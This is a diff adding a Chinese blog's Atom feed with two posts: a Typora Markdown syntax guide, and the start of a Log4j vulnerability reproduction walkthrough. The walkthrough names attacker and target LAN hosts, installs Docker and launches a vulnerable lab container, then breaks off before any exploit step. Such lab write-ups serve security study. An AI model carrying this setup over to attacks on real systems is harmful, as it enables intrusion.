@@ -1,0 +1,156 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://moonoon20.github.io</id>
+    <title>月のブログ</title>
+    <subtitle>时光如白驹过隙</subtitle>
+    <icon>https://moonoon20.github.io/images/favicon.ico</icon>
+    <link href="https://moonoon20.github.io" />
+    <author>
+      <name>Moon</name>
+    </author>
+    <updated>2021-12-19T14:49:37.000Z</updated>
+    <entry>
+        <id>https://moonoon20.github.io/2021/12/19/Typora%E8%AF%AD%E6%B3%95/</id>
+        <title>Typora语法</title>
+        <link rel="alternate" href="https://moonoon20.github.io/2021/12/19/Typora%E8%AF%AD%E6%B3%95/"/>
+        <content type="html">&lt;p&gt;&lt;a href=&#34;https://typora.io&#34;&gt;&lt;strong&gt;Typora&lt;/strong&gt;&lt;/a&gt; 是一款由 Abner Lee 开发的轻量级&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvTWFya2Rvd24=&#34;&gt; Markdown&lt;/span&gt; 编辑器，适用于 OS X、Windows 和 Linux 三种操作系统。与其他 Markdown 编辑器不同的是，Typora 没有采用源代码和预览双栏显示的方式，而是采用所见即所得的编辑方式，实现了即时预览的功能，但也可切换至源代码编辑模式。&lt;/p&gt;
+&lt;h1 id=&#34;标题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#标题&#34;&gt;#&lt;/a&gt; 标题&lt;/h1&gt;
+&lt;p&gt;一级标题： &lt;code&gt;#+space+text&lt;/code&gt;  快捷键 Commend+number&lt;/p&gt;
+&lt;p&gt;二级标题： &lt;code&gt;##+space+text&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;三级标题： &lt;code&gt;###+space+text&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;...&lt;/p&gt;
+&lt;p&gt;最多六级&lt;/p&gt;
+&lt;h1 id=&#34;文本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文本&#34;&gt;#&lt;/a&gt; 文本&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;倾斜&lt;/em&gt;： &lt;code&gt;*倾斜*&lt;/code&gt;  快捷键 Commend+L&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;加粗&lt;/strong&gt;： &lt;code&gt;**加粗**&lt;/code&gt;  快捷键 Commend+B&lt;/p&gt;
+&lt;p&gt;&lt;s&gt;删除&lt;/s&gt;： &lt;code&gt;~~删除~~&lt;/code&gt;  快捷键 Commend+shift+`&lt;/p&gt;
+&lt;p&gt;&amp;lt;u&amp;gt; 下划线 &amp;lt;/u&amp;gt;： &lt;code&gt;&amp;lt;u&amp;gt;下划线&amp;lt;/u&amp;gt;&lt;/code&gt;  快捷键 Commend+U&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;高亮&lt;/mark&gt;： &lt;code&gt;==高亮==&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;图像： &lt;code&gt;![text](image url)&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;引用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#引用&#34;&gt;#&lt;/a&gt; 引用&lt;/h1&gt;
+&lt;p&gt;引用： &lt;code&gt;&amp;gt;+space&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;quot;JOJO，我不做人啦！&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#列表&#34;&gt;#&lt;/a&gt; 列表&lt;/h1&gt;
+&lt;p&gt;4.1 无序列表： &lt;code&gt;+/-/*&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;无&lt;/li&gt;
+&lt;li&gt;序&lt;/li&gt;
+&lt;li&gt;列&lt;/li&gt;
+&lt;li&gt;表&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;4.2 有序列表： &lt;code&gt;number+.+space+text&lt;/code&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;有&lt;/li&gt;
+&lt;li&gt;序&lt;/li&gt;
+&lt;li&gt;列&lt;/li&gt;
+&lt;li&gt;表&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;4.3 任务列表： &lt;code&gt;-+space+[space]+text&lt;/code&gt;&lt;/p&gt;
+&lt;ul class=&#34;task-list&#34;&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_0&#34;&gt; 任&lt;/label&gt;&lt;/li&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_1&#34;&gt; 务&lt;/label&gt;&lt;/li&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_2&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_2&#34;&gt; 列&lt;/label&gt;&lt;/li&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_3&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_3&#34;&gt; 表&lt;/label&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码&#34;&gt;#&lt;/a&gt; 代码&lt;/h1&gt;
+&lt;p&gt;单行：`` 中间写 code&lt;/p&gt;
+&lt;p&gt;单行 &lt;code&gt;code&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;多行：```+python+Enter&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;多行&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string backtick-quoted-string&#34;&gt;``&lt;/span&gt;`&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;Enter&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;超链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#超链接&#34;&gt;#&lt;/a&gt; 超链接&lt;/h1&gt;
+&lt;p&gt;6.1 网址： &lt;code&gt;[文本]+(url)&lt;/code&gt;  快捷键 Commend+K&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ29nbGUuY29t&#34;&gt;Google&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;6.2 本地： &lt;code&gt;[文本]+(url)&lt;/code&gt;  快捷键 Commend+K&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;/Users/Documents/image/1.jpeg&#34;&gt;本地&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释&#34;&gt;#&lt;/a&gt; 注释&lt;/h1&gt;
+&lt;p&gt;注释&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn1&#34; id=&#34;fnref1&#34;&gt;[1]&lt;/a&gt;&lt;/sup&gt;： &lt;code&gt;text[^number]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;注解： &lt;code&gt;[^number]:&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;分割线&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分割线&#34;&gt;#&lt;/a&gt; 分割线&lt;/h1&gt;
+&lt;p&gt;分割线： &lt;code&gt;---+Enter&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;语法：&amp;lt;hr&amp;gt; 文本 &amp;lt;/hr&amp;gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;hr&amp;gt; 分割线 &amp;lt;/hr&amp;gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;hr&amp;gt;&amp;lt;/hr&amp;gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h1 id=&#34;上下标&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上下标&#34;&gt;#&lt;/a&gt; 上下标&lt;/h1&gt;
+&lt;p&gt;上&lt;sup&gt;标&lt;/sup&gt;： &lt;code&gt;上^标^&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;下&lt;sub&gt;标&lt;/sub&gt;： &lt;code&gt;下~标~&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;表格&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#表格&#34;&gt;#&lt;/a&gt; 表格&lt;/h1&gt;
+&lt;p&gt;快捷键 Commend+Alt+T&lt;/p&gt;
+&lt;h1 id=&#34;公式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#公式&#34;&gt;#&lt;/a&gt; 公式&lt;/h1&gt;
+&lt;p&gt;公式： &lt;code&gt;$公式$&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;f(x)=e^2+1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.897438em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
+&lt;p&gt;&amp;lt;button&amp;gt; 按钮 &amp;lt;/button&amp;gt;： &lt;code&gt;&amp;lt;button&amp;gt;按钮&amp;lt;/button&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;emoji： &lt;code&gt;:emoji:&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;太🐶了&lt;/p&gt;
+&lt;p&gt;你懂个🔨&lt;/p&gt;
+&lt;p&gt;生成目录： &lt;code&gt;[toc]&lt;/code&gt;&lt;/p&gt;
+&lt;hr class=&#34;footnotes-sep&#34; /&gt;
+&lt;section class=&#34;footnotes&#34;&gt;
+&lt;ol class=&#34;footnotes-list&#34;&gt;
+&lt;li id=&#34;fn1&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;&lt;em&gt;注释：注释与注解&lt;/em&gt; &lt;a href=&#34;#fnref1&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</content>
+        <category term="typora" scheme="https://moonoon20.github.io/tags/typora/" />
+        <updated>2021-12-19T14:49:37.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://moonoon20.github.io/2021/12/19/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
+        <title>Log4j漏洞复现</title>
+        <link rel="alternate" href="https://moonoon20.github.io/2021/12/19/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+        <content type="html">&lt;h1 id=&#34;log4j漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#log4j漏洞复现&#34;&gt;#&lt;/a&gt; Log4j 漏洞复现&lt;/h1&gt;
+&lt;h2 id=&#34;漏洞复现环境介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现环境介绍&#34;&gt;#&lt;/a&gt; 漏洞复现环境介绍&lt;/h2&gt;
+&lt;p&gt;局域网&lt;/p&gt;
+&lt;p&gt;攻击机器：MacOS BigSur&lt;/p&gt;
+&lt;p&gt;攻击 IP：192.168.1.9&lt;/p&gt;
+&lt;p&gt;目标机器：Centos7&lt;/p&gt;
+&lt;p&gt;目标 IP：192.168.1.16&lt;/p&gt;
+&lt;h2 id=&#34;前期准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前期准备&#34;&gt;#&lt;/a&gt; 前期准备&lt;/h2&gt;
+&lt;h3 id=&#34;目标机器安装docker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标机器安装docker&#34;&gt;#&lt;/a&gt; 目标机器安装 Docker&lt;/h3&gt;
+&lt;p&gt;参考&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzAxNDUx&#34;&gt; Centos7 安装 Docker&lt;/span&gt;，这里就贴一些关键命令。&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#更新 yum 包 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yum -y update &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#卸载旧版本（如果之前安装过的话） &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yum remove docker docker-common docker-selinux docker-engine &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#安装需要的软件包 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yum &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; -y yum-utils device-mapper-persistent-data lvm2 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#设置 yum 源 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yum-config-manager --add-repo http://download.docker.com/linux/centos/docker-ce.repo（中央仓库） &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo（阿里仓库） &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#查看可用版本 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yum list docker-ce --showduplicates &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sort&lt;/span&gt; -r &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#安装 docker &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yum -y &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; docker-ce-18.03.1.ce&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;附一些 docker 常用命令&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#启动 docker 服务           &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systemctl start docker&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#重启 docker 服务   &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systemctl restart  docker&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#关闭 docker 服务   &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systemctl stop docker&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#镜像搭建容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker run -dt --name &lt;span class=&#34;token string&#34;&gt;&#39;自定义容器名称&#39;&lt;/span&gt; -p &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;:80 --rm &lt;span class=&#34;token string&#34;&gt;&#39;镜像名称&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#查看所有容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker &lt;span class=&#34;token function&#34;&gt;ps&lt;/span&gt; -a    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#进入容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker &lt;span class=&#34;token builtin class-name&#34;&gt;exec&lt;/span&gt; -it 容器ID /bin/bash    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker &lt;span class=&#34;token builtin class-name&#34;&gt;exec&lt;/span&gt; -it 容器ID /bin/sh   &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#开启容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker start 容器ID    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#停止容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker stop 容器ID       &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#删除容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker &lt;span class=&#34;token function&#34;&gt;rm&lt;/span&gt; 容器ID         &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#删除镜像&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker rmi 容器ID&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;目标机器搭建漏洞靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标机器搭建漏洞靶场&#34;&gt;#&lt;/a&gt; 目标机器搭建漏洞靶场&lt;/h3&gt;
+&lt;p&gt;参照&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYzMTMy&#34;&gt; Log4J 漏洞复现 + 漏洞靶场&lt;/span&gt;，依次执行命令。&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#拉取 docker 镜像&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#根据镜像搭建容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker run -it -d -p &lt;span class=&#34;token number&#34;&gt;8080&lt;/span&gt;:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token 